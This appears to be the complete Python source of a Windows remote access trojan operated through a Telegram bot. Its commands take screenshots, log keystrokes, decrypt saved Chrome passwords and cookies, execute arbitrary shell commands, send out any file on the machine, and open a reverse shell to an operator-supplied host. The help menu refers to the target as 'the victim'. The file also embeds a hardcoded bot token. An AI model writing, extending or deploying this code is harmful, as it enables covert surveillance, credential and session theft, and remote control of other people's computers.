import pyscreenshot
import pyautogui as pg
import ctypes
import os
import sqlite3
from datetime import datetime, timedelta
import datetime
import telegram
from telegram.ext.commandhandler import CommandHandler
from telegram.ext.updater import Updater
from telegram.ext.dispatcher import Dispatcher
from telegram.update import Update
from telegram.ext.callbackcontext import CallbackContext
from threading import Thread
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import json
import subprocess
import socket
import winreg


# -------------------------GET Local User-------------------------
global local_user
local_user = os.getlogin()
global capture
capture = False

# setting up the folder
base_path = 'C:\\Users\\' + local_user + '\\Saved Games\\'

# -------------------------------BOT---------------------------------------
bot = telegram.Bot(token='5824553439:AAGNAWmY2MrOZUy8WCyoMpVrWpP3fgjBx18')
# add chat id
chat_id = '@C2Ctelegram'
bot_chatid = '5824553439'


# send message
def send_message(reply):
    bot.sendMessage(chat_id=chat_id, text=reply)


# send photo
def send_photo(path):
    bot.sendPhoto(chat_id=chat_id, photo=open(path, 'rb'))


# send document
def send_document(path):
    bot.sendDocument(chat_id=chat_id, document=open(path, 'rb'))


# send audio
def send_audio(path):
    bot.sendAudio(chat_id=chat_id, audio=open(path, 'rb'))


# -------------------------GET WINDOWS TITLE-------------------------
# get current window title
def get_current_window():
    global title
    title = pg.getActiveWindowTitle()
    send_message(reply=title)
    return title


# -------------------------GET SCREENSHOT-------------------------
# take screenshot
def screen():
    Get_image = pyscreenshot.grab()
    # save screenshot
    Get_image.save(base_path + 'img.png')
    send_photo(base_path + 'img.png')
    os.remove(base_path + 'img.png')


# -------------------------GET-COMMANDS--------------------------
def run_command(commands):
    command_reply = os.popen(commands).read()
    if command_reply == "":
        send_message(reply="Syntax Error!")
    else:
        send_message(reply=command_reply)


# -------------------------KEYS-------------------------

def get_strokes():
    user32 = ctypes.windll.user32
    GetAsyncKeyState = user32.GetAsyncKeyState
    special_keys = {0x08: 'BS', 0x09: 'Tab', 0x10: 'Shift', 0x11: 'Ctrl', 0x12: 'Alt', 0x14: 'CapsLock', 0x1b: 'Esc',
                    0x20: 'Space', 0x2e: 'Del'}
    line = []  # List to store the keystrokes
    with open(base_path + "keys.txt", "a") as f:  # GETTING THE CURRENT WINDOWS
        f.write(str(pg.getActiveWindowTitle() + ' ===> Time ' + str(datetime.datetime.now()) + '\n'))
        f.close()
        while capture == True:
            f = open(base_path + "keys.txt", "a")
            for i in range(1, 256):
                if GetAsyncKeyState(i) & 1:
                    if i in special_keys:
                        line.append(special_keys[i])
                        f.write(str(line))
                        f.write('\n')
                        line = []

                    else:
                        line.append(chr(i))
                        f.write(str(line))
                        f.write('\n')
                        line = []
                        f.close()


# ------------------------capture password from chrome-----------------------------

# get AES key
def fetching_encryption_key():
    # Local_computer_directory_path will
    # look like this below
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State

    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google",
        "Chrome", "User Data", "Local State")

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])

    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]

    # return decrypted key
    return win32crypt.CryptUnprotectData(
        encryption_key, None, None, None, 0)[1]


# Decrypt the passwords
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        # generate cipher

        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"


def get_passwords():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = base_path + "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        if user_name or decrypted_password:
            f = base_path + "passwords.txt"
            f = open(f, "a")
            f.write(f"Main URL: {main_url}")
            f.write("\n")
            f.write(f"Login URL: {login_page_url}")
            f.write("\n")
            f.write(f"Username: {user_name}")
            f.write("\n")
            f.write(f"Decrypted Password: {decrypted_password}")
            f.write("\n")
            f.close()
        else:
            continue
    send_document(path=base_path + "passwords.txt")


# ---------------------------COOKIES-----------------------#


COOKIES_DB_PATH = os.path.join(
    os.environ["USERPROFILE"], "AppData", "Local",
    "Google", "Chrome", "User Data", "Default", "Network", "Cookies"
)


def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except:
            return chromedate
    else:
        return ""


def get_encryption_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove 'DPAPI' str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except Exception:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except Exception:
            # not supported
            return ""

def Sessions():
    # local sqlite Chrome cookie database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    # copy the file to current directory
    # as the database will be locked if chrome is currently open
    filename = base_path+"Cookies.db"
    if not os.path.isfile(filename):
        # copy file when does not exist in the current directory
        shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    # ignore decoding errors
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    # get the cookies from `cookies` table
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
    # you can also search by domain, e.g thepythoncode.com
    # cursor.execute("""
    # SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
    # FROM cookies
    # WHERE host_key like '%thepythoncode.com%'""")
    # get the AES key
    key = get_encryption_key()
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_data(encrypted_value, key)
        else:
            # already decrypted
            decrypted_value = value
        f = open(base_path + "cookies.txt", "a")
        f.write(f"""
        Host: {host_key}
        Cookie name: {name}
        Cookie value (decrypted): {decrypted_value}
        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        ===============================================================\n""")
        # update the cookies table with the decrypted value
        # and make session cookie persistent
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    # commit changes
    db.commit()
    # close connection
    db.close()
    send_document(path=base_path+'cookies.txt')
    os.wait(5)
    os.remove(base_path + 'cookies.txt')
    os.remove(base_path + 'Cookies.db')





def Profiles():
    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google",
        "Chrome", "User Data", "Local State")

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
        # This will return the data about logged in sessions
    profiles = (local_state_data["profile"])
    f = open(base_path + "sessions.txt", "a")
    f.write(str(profiles))
    f.close()
    send_document(path=base_path + "Profiles.txt")
    os.remove(base_path + "Profiles.txt")


# --------------------------RETRIVE FILES--------------------------




def retrieve_files(path):
    docs = ['txt', 'xml', 'xls', 'docx', 'ppt', 'json','ovpn', 'doc', 'pdf', 'xls', 'xlsx', 'pptx', 'csv', 'html', 'htm',
            'php', 'asp', 'aspx', 'js', 'css', 'sql', 'mdb', 'db', 'py', 'cpp', 'c', 'java', 'jar', 'bat', 'exe', 'dll',
            'ini', 'cfg', 'ini', 'log', 'tmp', 'zip', 'rar', '7z', 'tar', 'gz']
    img = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'ico', 'psd', 'svg', 'tif', 'tiff']
    vid = ['mp4', 'avi', 'mkv', 'flv', 'wmv', 'mov', 'mpg', 'mpeg', '3gp', 'webm', 'vob', 'ogv', 'ogg', 'm4v', 'swf']
    if os.path.exists(path):
        extension = path.split(".")[-1]
        if extension in docs:
            send_document(path=path)
        if extension in img:
            send_photo(path=path)
        if extension in vid:
            send_audio(path=path)
        else:
            pass

#--------------------------REVERSE SHELL--------------------------

def reverse_shell(SERVER_HOST, SERVER_PORT):
    BUFFER_SIZE = 1024
    # create the socket object
    s = socket.socket()
    # connect to the server
    s.connect((SERVER_HOST, SERVER_PORT))
    # receive the greeting message
    message = s.recv(BUFFER_SIZE).decode()
    while True:
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
        # send the results back to the server
        s.send(output.encode())
    # close client connection
    s.close()



# --------------------SETTING COMMANDS FOR BOT--------------------
updater = Updater("5824553439:AAGNAWmY2MrOZUy8WCyoMpVrWpP3fgjBx18", use_context=True)
dispatcher: Dispatcher = updater.dispatcher


def screenshot(update: Update, context: CallbackContext):
    bot: telegram = context.bot
    thread=Thread(target=screen)
    thread.start()
    bot.send_message(chat_id=update.effective_chat.id,
                     text="Check C2C telegram Group! The screenshot is there!")


def command(update: Update, context: CallbackContext):
    bot: telegram = context.bot
    command_to_run = update.message.text  # command text including /command
    if len(command_to_run) > 8:
        command_to_run = command_to_run.replace('/command ', '')
        print(command_to_run)
        thread = Thread(target=run_command, args=(command_to_run,))
        thread.start()
        bot.send_message(chat_id=update.effective_chat.id,
                         text="Check C2C telegram Group! The reply is there!")


def current_windows(update: Update, context: CallbackContext):
    bot: telegram = context.bot
    thread = Thread(target=get_current_window)
    thread.start()
    bot.send_message(chat_id=update.effective_chat.id,
                     text="Check C2C telegram Group! The current window is there!")


# initiate keylogger function
# This function is used to trigger the function that will start the keylogger and send the logs to a file
# The get_strokes function contains a while loop that will run continously so we will run it in another thread

def capture_keys(update: Update, context: CallbackContext):
    bot: telegram = context.bot
    global capture
    capture = True
    thread = Thread(target=get_strokes)
    thread.start()
    bot.send_message(chat_id=update.effective_chat.id, text="STARTED CAPTURING KEYS")


# stop keylogger function
# This function is used to stop the keylogger and send the file to the telegram group
# This functions sets the global variable to false so that the while loop in the get_strokes function will stop
def stop_capture_keys(update: Update, context: CallbackContext):
    bot: telegram = context.bot
    global capture
    capture = False
    send_document(path=base_path + 'keys.txt')  # send the file
    os.remove(base_path + "keys.txt")
    bot.send_message(chat_id=update.effective_chat.id, text="STOPPED CAPTURING KEYS")


# This function is used to display the help menu
def help(update: Update, context: CallbackContext):
    bot: telegram = context.bot
    text = "You can run the following commands:\n\n/screenshot: Takes ScreenShot.\n/command: Execute arbitary commands i.e /commands <command> \n/current_windows: Get the title of current window\n/capture_keys: Start capturing the keystrokes\n/stop_capture_keys: Stop Key Capture and recieve file\n/Extract_cookies: Get Saved Cookies from the browser\n/saved_passwords: Get saved password in Chrome browser\n/Profiles_Logged_In: Get information about logged in profiles in chrome\n/get_file: Retrive any file from the victim by giving path \n/revshell :Get a reverse shell connection to host and port provided i.e /revshell <host ip> <port>\n/help: See menu"
    bot.send_message(chat_id=update.effective_chat.id, text=text)


# This function is used to get the saved passwords in chrome browser
# This function will trigger the get_passwords function which triggers the password_decryption function and
# the fetching_encryption_key function to get the passwords and decrypt them and send them to a file
# after th
def passwords(update: Update, context: CallbackContext):
    bot: telegram = context.bot
    thread=Thread(target=get_passwords)
    thread.start()
    os.remove(base_path + "passwords.txt")
    os.remove(base_path + "ChromePasswords.db")
    bot.send_message(chat_id=update.effective_chat.id, text="Check the C2C telegram group for the password!")


def getpf(update: Update, context: CallbackContext):
    bot: telegram = context.bot
    thread = Thread(target=Profiles)

    thread.start()
    bot.send_message(chat_id=update.effective_chat.id, text="Check the C2C telegram group for the session!")


# Cookies
def cook(update: Update, context: CallbackContext):
    bot: telegram = context.bot
    thread = Thread(target=Sessions)
    thread.start()

    bot.send_message(chat_id=update.effective_chat.id, text="Check the C2C telegram group for the Cookies!")

# Function to initiate the reverse shell
def revshell(update: Update, context: CallbackContext):
    bot: telegram = context.bot
    msg = update.message.text
    msg = msg.split(" ")
    print(msg)
    SERVER_HOST = msg[-2]
    SERVER_PORT = int(msg[-1])
    thread = Thread(target=reverse_shell, args=(SERVER_HOST, SERVER_PORT))
    thread.start()
    bot.send_message(chat_id=update.effective_chat.id, text="Check the C2C telegram group for the session!")


# This function is used to get files from computer to the bot
def get_file(update: Update, context: CallbackContext):
    bot: telegram = context.bot
    path = update.message.text
    path = path.replace('/get_file ', '')
    thread = Thread(target=retrieve_files, args=(path,))
    thread.start()
    bot.send_message(chat_id=update.effective_chat.id, text="File retrived and sent to C2C telegram group!")





dispatcher.add_handler(CommandHandler("screenshot", screenshot))
dispatcher.add_handler(CommandHandler("command", command))
dispatcher.add_handler(CommandHandler("current_windows", current_windows))
dispatcher.add_handler(CommandHandler("capture_keys", capture_keys))
dispatcher.add_handler(CommandHandler("stop_capture_keys", stop_capture_keys))
dispatcher.add_handler(CommandHandler("saved_passwords", passwords))
dispatcher.add_handler(CommandHandler("Profiles_Logged_In", getpf))
dispatcher.add_handler(CommandHandler("Extract_Cookies",cook))
dispatcher.add_handler(CommandHandler("revshell", revshell))
dispatcher.add_handler(CommandHandler("get_file", get_file))
dispatcher.add_handler(CommandHandler("help", help))
updater.start_polling()
